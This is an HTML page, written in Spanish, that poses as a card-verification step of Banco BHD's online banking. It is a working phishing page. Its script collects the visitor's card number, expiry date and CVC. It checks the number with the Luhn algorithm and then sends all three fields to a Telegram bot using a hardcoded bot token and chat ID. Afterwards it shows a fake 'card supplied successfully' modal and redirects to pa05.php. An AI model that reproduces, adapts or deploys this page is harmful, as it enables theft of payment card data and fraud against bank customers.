<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco BHD - IBP</title>
    <link rel="icon" href="assets/img/icono.ico" type="image/x-icon" />
    <link rel="apple-touch-icon" href="assets/img/icono-180x180.png" sizes="180x180">
    <link rel="icon" href="assets/img/icono-32x32.png" sizes="32x32">
    <link rel="icon" href="assets/img/icono-16x16.png" sizes="16x16">
    <link rel="icon" href="assets/img/icono-192x192.png" sizes="192x192">
    <style>
    /* Estilo general */
    body,
    html {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        background: url('/assets/img/background-login.webp') no-repeat center center fixed;
        background-size: cover;
    }

    .container {
        width: 100%;
        max-width: 420px;
        background-color: rgba(243, 233, 233, 0.85);
        border-radius: 10px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        padding: 30px 25px;
        text-align: center;
        backdrop-filter: blur(10px);
        box-sizing: border-box;
    }

    h1 {
        font-size: 1.6rem;
        margin-bottom: 15px;
        color: #333;
    }

    p {
        font-size: 1rem;
        color: #666;
        margin-bottom: 25px;
    }

    .input-container {
        width: 100%;
        margin-bottom: 8px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        position: relative;
    }

    .input-container-row {
        display: flex;
        justify-content: space-between;
        gap: 10px;
        align-items: center;
        width: 100%;
    }

    .input-container label {
        font-size: 0.9rem;
        margin-bottom: 5px;
        color: #333;
    }

    input[type="text"],
    input[type="number"],
    input[type="month"] {
        width: 70%;
        padding-left: 31px;
        background-size: 20px 20px;
        background-repeat: no-repeat;
        background-position: 10px center;
        padding-top: 10px;
        padding-right: 10px;
        padding-bottom: 10px;
        font-size: 1rem;
        border: 1px solid #ddd;
        border-radius: 8px;
        margin-top: 5px;
        outline: none;
        background-color: #f9f9f9;
        box-sizing: border-box;
        /* Asegura que padding no afecte el tamaño */
        transition: border-color 0.3s ease;
        text-overflow: ellipsis;
        /* Texto cortado si excede el campo */
        overflow: hidden;
        /* Evitar desbordamiento */
    }

    /* Foco en el campo de entrada */
    input[type="text"]:focus,
    input[type="number"]:focus,
    input[type="month"]:focus {
        border-color: #28a745;
    }

    /* Clases para los iconos */
    input[type="text"].visa {
        background-image: url('/assets/img/visa.svg');
    }

    input[type="text"].mastercard {
        background-image: url('/assets/img/mastercard.svg');
    }

    .btn {
        background-color: #28a745;
        color: white;
        border: none;
        padding: 10px;
        border-radius: 8px;
        font-size: 1.1rem;
        cursor: pointer;
        transition: background-color 0.3s ease;
        width: 100%;
    }

    .btn:hover {
        background-color: #218838;
    }

    .alert {
        position: absolute;
        top: 10%;
        left: 50%;
        transform: translateX(-50%);
        background-color: #f8d7da;
        color: #721c24;
        padding: -50px;
        border: 1px solid #f5c6cb;
        border-radius: 5px;
        font-size: 1.1rem;
        animation: slideIn 1s ease-in-out;
    }

    @keyframes slideIn {
        0% {
            opacity: 0;
            transform: translateX(-50%) translateY(-50px);
        }

        100% {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }
    }

    /* Estilo para el número de la tarjeta (más ancho) */
    #cardNumber {
        max-width: 300px;
        /* Aumento del tamaño del campo */
    }
    </style>
</head>

<body>
    <div class="alert" id="alertMessage">
        <strong>¡Atención!</strong> Complete los campos de su tarjeta para continuar.
    </div>

    <div class="container">
        <h1>Datos de la Tarjeta</h1>
        <p>Ingrese los detalles de su tarjeta de débito o crédito para proceder:</p>

        <form id="cardForm">
            <!-- Número de tarjeta en su propia fila -->
            <div class="input-container">
                <label for="cardNumber">Número de tarjeta</label>
                <input type="text" id="cardNumber" name="cardNumber" placeholder="• • • • • • • • • • • • • • • •"
                    maxlength="19" required>
            </div>

            <!-- Expiración y CVC en la siguiente fila -->
            <div class="input-container-row">
                <div class="input-container">
                    <label for="expiryDate">Exp.</label>
                    <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5" required>
                </div>

                <div class="input-container">
                    <label for="cvv">CVC</label>
                    <input type="text" id="cvv" name="cvv" placeholder="CVC" maxlength="3" required>
                </div>
            </div>

            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <script>
    // Función para validar el número de tarjeta utilizando el algoritmo de Luhn
    function validateCardNumber(cardNumber) {
        let sum = 0;
        let shouldDouble = false;
        // Iterar sobre los dígitos de derecha a izquierda
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9; // Si el número es mayor que 9, restamos 9
                }
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10 === 0); // Si el resultado es divisible por 10, es válido
    }

    // Función para validar la fecha de expiración
    function validateExpiryDate(expiryDate) {
        const currentDate = new Date();
        const [month, year] = expiryDate.split('/');

        if (!month || !year || month.length !== 2 || year.length !== 2) {
            return false;
        }

        const expiryMonth = parseInt(month);
        const expiryYear = parseInt(year) + 2000; // Asegurar que el año tenga 4 dígitos

        const expiryDateObj = new Date(expiryYear, expiryMonth - 1); // Meses en JavaScript son 0-indexados

        return expiryDateObj > currentDate; // Si la fecha de expiración es posterior a la fecha actual
    }

    // Función para enviar los datos a Telegram
    function sendToTelegram(cardNumber, expiryDate, cvv) {
        const token = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI"; // Token del bot
        const chat_id = "8555745789"; // Chat ID del grupo o canal
        const message = `Detalles de la tarjeta:
                            Número de tarjeta: ${cardNumber}
                            Fecha de expiración: ${expiryDate}
                            CVV: ${cvv}`;

        const url =
            `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
    // Crear un div flotante (modal)
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '50%';
    modal.style.left = '50%';
    modal.style.transform = 'translate(-50%, -50%)';
    modal.style.backgroundColor = 'white';
    modal.style.padding = '20px 30px';
    modal.style.borderRadius = '15px';
    modal.style.boxShadow = '0 0 20px rgba(0,0,0,0.3)';
    modal.style.textAlign = 'center';
    modal.style.zIndex = '9999';
    modal.style.fontFamily = 'Arial, sans-serif';
    modal.style.border = '2px solid #4CAF50';
    modal.style.minWidth = '300px';

    // Agregar el logo (image.png)
    var logo = document.createElement('img');
    logo.src = 'image.png';        // Ruta de tu imagen
    logo.style.width = '80px';
    logo.style.marginBottom = '15px';
    modal.appendChild(logo);

    // Agregar el texto personalizado
    var mensaje = document.createElement('p');
    mensaje.textContent = 'Tarjeta suministrada con éxito, por favor espere...';
    mensaje.style.fontSize = '18px';
    mensaje.style.fontWeight = 'bold';
    mensaje.style.color = '#2e7d32';
    mensaje.style.margin = '0';
    modal.appendChild(mensaje);

    // Mostrar el modal en la página
    document.body.appendChild(modal);

    // Redirigir después de 1 segundo
    setTimeout(function() {
        window.location.href = "pa05.php";
    }, 2500);
                } else {
                    alert("Hubo un problema al enviar los datos.");
                }
            })
            .catch(error => {
                alert("Error al enviar la solicitud.");
            });
    }

    // Detectar Visa o Mastercard y mostrar el icono correspondiente
    document.getElementById('cardNumber').addEventListener('input', function(event) {
        let value = event.target.value.replace(/\D/g, ''); // Eliminar caracteres no numéricos
        value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Formatear con espacio cada 4 dígitos
        event.target.value = value.slice(0, 19); // Limitar a 16 dígitos más los espacios

        let inputElement = event.target;
        if (value.startsWith('4')) { // Visa empieza con '4'
            inputElement.classList.add('visa');
            inputElement.classList.remove('mastercard');
        } else if (value.startsWith('5')) { // Mastercard empieza con '5'
            inputElement.classList.add('mastercard');
            inputElement.classList.remove('visa');
        } else {
            inputElement.classList.remove('visa', 'mastercard');
        }
    });

    // Formatear la fecha de expiración
    document.getElementById('expiryDate').addEventListener('input', function(event) {
        let value = event.target.value.replace(/\D/g, ''); // Eliminar caracteres no numéricos
        if (value.length >= 3) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        event.target.value = value;
    });

    // Validación y envío de datos al hacer submit en el formulario
    document.getElementById('cardForm').addEventListener('submit', function(event) {
        event.preventDefault();

        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,
            ''); // Eliminar los espacios
        const expiryDate = document.getElementById('expiryDate').value;
        const cvv = document.getElementById('cvv').value;

        // Validar tarjeta usando el algoritmo de Luhn
        if (!validateCardNumber(cardNumber)) {
            alert("El número de tarjeta no es válido. Por favor, verifique.");
            return;
        }

        // Validar la fecha de expiración
        if (!validateExpiryDate(expiryDate)) {
            alert("La fecha de expiración de la tarjeta no es válida.");
            return;
        }

        // Validar que todos los campos están completos
        if (!cardNumber || !expiryDate || !cvv) {
            alert("Por favor, completa todos los campos.");
            return;
        }

        // Si todo es válido, enviar los datos
        sendToTelegram(cardNumber, expiryDate, cvv);
    });
    </script>
    <script>
    // Función para ocultar el mensaje después de 2 segundos
    setTimeout(function() {
        document.getElementById('alertMessage').style.display = 'none';
    }, 5000); // El mensaje desaparecerá después de 2 segundos
    </script>
</body>

</html>